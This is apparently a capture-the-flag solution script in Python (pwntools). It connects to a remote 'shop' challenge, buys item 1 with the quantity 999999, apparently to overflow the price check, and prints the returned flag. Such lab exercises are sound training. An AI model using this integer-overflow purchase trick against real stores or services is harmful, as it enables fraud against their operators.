from pwn import *

#local file
#p=process('./shop')
p=remote('140.113.24.241',30170)

p.recv()

p.sendline(b'1')


p.recv()
p.sendline(b'999999')
p.recvuntil(b'You have purchased the flag\n')
response=p.recv()
# Extract the flag
response_lines = response.decode().split('\n')

# Iterate over the lines and find the one starting with 'FLAG'
for line in response_lines:
    if line.startswith('FLAG'):
        flag = line
        print(flag)
        break

p.close()